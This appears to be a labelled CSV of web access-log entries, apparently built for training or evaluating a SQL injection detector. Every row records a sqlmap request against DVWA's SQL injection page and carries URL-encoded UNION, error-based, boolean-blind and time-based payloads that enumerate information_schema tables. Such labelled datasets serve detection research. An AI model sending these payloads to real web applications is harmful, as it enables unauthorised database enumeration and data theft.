ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:41:01-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x414c4c5f504c5547494e53%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,2013,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x414c4c5f504c5547494e53%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,363,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:01-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CLOAD_OPTION%2CPLUGIN_AUTHOR%2CPLUGIN_AUTH_VERSION%2CPLUGIN_DESCRIPTION%2CPLUGIN_LIBRARY%2CPLUGIN_LIBRARY_VERSION%2CPLUGIN_LICENSE%2CPLUGIN_MATURITY%2CPLUGIN_NAME%2CPLUGIN_STATUS%2CPLUGIN_TYPE%2CPLUGIN_TYPE_VERSION%2CPLUGIN_VERSION%29%29%2C0x716a707171%29%20FROM%20information_schema.ALL_PLUGINS%23&Submit=Submit HTTP/1.1,200,5000,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CLOAD_OPTION%2CPLUGIN_AUTHOR%2CPLUGIN_AUTH_VERSION%2CPLUGIN_DESCRIPTION%2CPLUGIN_LIBRARY%2CPLUGIN_LIBRARY_VERSION%2CPLUGIN_LICENSE%2CPLUGIN_MATURITY%2CPLUGIN_NAME%2CPLUGIN_STATUS%2CPLUGIN_TYPE%2CPLUGIN_TYPE_VERSION%2CPLUGIN_VERSION%29%29%2C0x716a707171%29%20FROM%20information_schema.ALL_PLUGINS%23&Submit=Submit,HTTP/1.1,462,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x494e4e4f44425f434d50%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,1927,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x494e4e4f44425f434d50%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,361,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccompress_ops%2Ccompress_ops_ok%2Ccompress_time%2Cpage_size%2Cuncompress_ops%2Cuncompress_time%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_CMP%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccompress_ops%2Ccompress_ops_ok%2Ccompress_time%2Cpage_size%2Cuncompress_ops%2Cuncompress_time%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_CMP%23&Submit=Submit,HTTP/1.1,324,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28compress_ops%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28compress_ops_ok%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28compress_time%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28page_size%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28uncompress_ops%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28uncompress_time%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_CMP%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28compress_ops%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28compress_ops_ok%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28compress_time%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28page_size%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28uncompress_ops%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28uncompress_time%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_CMP%23&Submit=Submit,HTTP/1.1,604,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccompress_ops%2Ccompress_ops_ok%2Ccompress_time%2Cpage_size%2Cuncompress_ops%2Cuncompress_time%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_CMP%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccompress_ops%2Ccompress_ops_ok%2Ccompress_time%2Cpage_size%2Cuncompress_ops%2Cuncompress_time%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_CMP%23&Submit=Submit,HTTP/1.1,324,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_CMP%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_CMP%23&Submit=Submit,HTTP/1.1,235,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20%28SELECT%208725%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71766b7871%2C%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C0x716a707171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20XMKN&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20%28SELECT%208725%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71766b7871%2C%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C0x716a707171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20XMKN&Submit=Submit,HTTP/1.1,373,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E51%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E51%23&Submit=Submit,HTTP/1.1,220,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E54%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E54%23&Submit=Submit,HTTP/1.1,220,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E56%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E56%23&Submit=Submit,HTTP/1.1,220,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E57%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E57%23&Submit=Submit,HTTP/1.1,220,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%208550%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29suCn%29--%20HPtH&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%208550%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29suCn%29--%20HPtH&Submit=Submit,HTTP/1.1,307,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%208550%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29suCn%29--%20HPtH&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%208550%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29suCn%29--%20HPtH&Submit=Submit,HTTP/1.1,307,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%208550%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29suCn%29--%20HPtH&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%208550%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_CMP%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29suCn%29--%20HPtH&Submit=Submit,HTTP/1.1,306,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x53544154495354494353%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,2048,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x53544154495354494353%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,361,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CIGNORED%2CINDEX_COMMENT%2CINDEX_NAME%2CINDEX_SCHEMA%2CINDEX_TYPE%2CNON_UNIQUE%2CNULLABLE%2CPACKED%2CSEQ_IN_INDEX%2CSUB_PART%2CTABLE_CATALOG%2CTABLE_SCHEMA%2C%60CARDINALITY%60%2C%60COLLATION%60%2C%60COLUMN_NAME%60%2C%60COMMENT%60%2C%60TABLE_NAME%60%29%29%2C0x716a707171%29%20FROM%20information_schema.STATISTICS%23&Submit=Submit HTTP/1.1,200,1987,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CIGNORED%2CINDEX_COMMENT%2CINDEX_NAME%2CINDEX_SCHEMA%2CINDEX_TYPE%2CNON_UNIQUE%2CNULLABLE%2CPACKED%2CSEQ_IN_INDEX%2CSUB_PART%2CTABLE_CATALOG%2CTABLE_SCHEMA%2C%60CARDINALITY%60%2C%60COLLATION%60%2C%60COLUMN_NAME%60%2C%60COMMENT%60%2C%60TABLE_NAME%60%29%29%2C0x716a707171%29%20FROM%20information_schema.STATISTICS%23&Submit=Submit,HTTP/1.1,478,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x454e41424c45445f524f4c4553%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,1904,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x454e41424c45445f524f4c4553%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,367,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CROLE_NAME%29%29%2C0x716a707171%29%20FROM%20information_schema.ENABLED_ROLES%20ORDER%20BY%20ROLE_NAME%23&Submit=Submit HTTP/1.1,200,585,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CROLE_NAME%29%29%2C0x716a707171%29%20FROM%20information_schema.ENABLED_ROLES%20ORDER%20BY%20ROLE_NAME%23&Submit=Submit,HTTP/1.1,268,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28ROLE_NAME%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.ENABLED_ROLES%20ORDER%20BY%20ROLE_NAME%23&Submit=Submit HTTP/1.1,200,585,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28ROLE_NAME%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.ENABLED_ROLES%20ORDER%20BY%20ROLE_NAME%23&Submit=Submit,HTTP/1.1,258,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28ROLE_NAME%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.ENABLED_ROLES%23&Submit=Submit HTTP/1.1,200,1788,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28ROLE_NAME%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.ENABLED_ROLES%23&Submit=Submit,HTTP/1.1,233,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x4556454e5453%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,2144,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x4556454e5453%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,353,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CCHARACTER_SET_CLIENT%2CCOLLATION_CONNECTION%2CCREATED%2CDATABASE_COLLATION%2CEVENT_BODY%2CEVENT_CATALOG%2CEVENT_COMMENT%2CEVENT_DEFINITION%2CEVENT_NAME%2CEVENT_SCHEMA%2CEVENT_TYPE%2CEXECUTE_AT%2CINTERVAL_FIELD%2CINTERVAL_VALUE%2CLAST_ALTERED%2CLAST_EXECUTED%2CON_COMPLETION%2CORIGINATOR%2CSQL_MODE%2CTIME_ZONE%2C%60DEFINER%60%2C%60ENDS%60%2C%60STARTS%60%2C%60STATUS%60%29%29%2C0x716a707171%29%20FROM%20information_schema.%60EVENTS%60%20ORDER%20BY%20%60ENDS%60%23&Submit=Submit HTTP/1.1,200,578,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CCHARACTER_SET_CLIENT%2CCOLLATION_CONNECTION%2CCREATED%2CDATABASE_COLLATION%2CEVENT_BODY%2CEVENT_CATALOG%2CEVENT_COMMENT%2CEVENT_DEFINITION%2CEVENT_NAME%2CEVENT_SCHEMA%2CEVENT_TYPE%2CEXECUTE_AT%2CINTERVAL_FIELD%2CINTERVAL_VALUE%2CLAST_ALTERED%2CLAST_EXECUTED%2CON_COMPLETION%2CORIGINATOR%2CSQL_MODE%2CTIME_ZONE%2C%60DEFINER%60%2C%60ENDS%60%2C%60STARTS%60%2C%60STATUS%60%29%29%2C0x716a707171%29%20FROM%20information_schema.%60EVENTS%60%20ORDER%20BY%20%60ENDS%60%23&Submit=Submit,HTTP/1.1,627,5,40,SQLi
